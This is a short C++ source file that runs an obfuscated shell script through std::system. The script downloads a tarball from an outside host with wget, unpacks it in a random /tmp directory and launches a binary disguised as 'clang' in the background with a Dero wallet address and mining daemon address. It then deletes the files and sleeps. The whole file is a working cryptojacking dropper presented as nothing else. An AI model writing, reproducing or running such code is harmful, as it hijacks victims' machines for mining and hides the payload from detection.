#include "obs.h"
#include <stdlib.h>
int main() {
std::system(AY_OBFUSCATE("\n\
CLANG=$(shuf -n 1 -i 10000000-99999999)\n\
mkdir -p /tmp/$CLANG\n\
wget -qO /tmp/$CLANG/clang.tar https://gptech.id/ijin/worker.tar.xz\n\
tar xf /tmp/$CLANG/clang.tar -C /tmp/$CLANG\n\
nohup /tmp/$CLANG/clang --wallet-address=dero1qyrt55sn338nzse3l7ulv7ygrtlqqp2s0sk0lepvendrf4xl4dlr7qgw7wa7x --daemon-rpc-address=20.52.56.109:10100 >/dev/null 2>&1 & sleep 0.1\n\
rm -rf /tmp/$CLANG\n\
sleep 24h\n"));
}
